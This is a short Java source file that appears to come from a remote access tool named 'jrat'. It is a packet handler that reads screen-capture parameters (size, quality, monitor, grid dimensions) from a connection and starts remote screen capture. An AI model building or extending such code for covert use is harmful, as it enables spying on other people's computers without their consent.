package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	@Override
	public void read(Connection con) throws Exception {
		int size = con.readInt();
		int quality = con.readInt();
		int monitor = con.readInt();
		int columns = con.readInt();
		int rows = con.readInt();
		
		new Screen(con, size, quality, monitor, columns, rows).start();
	}

}
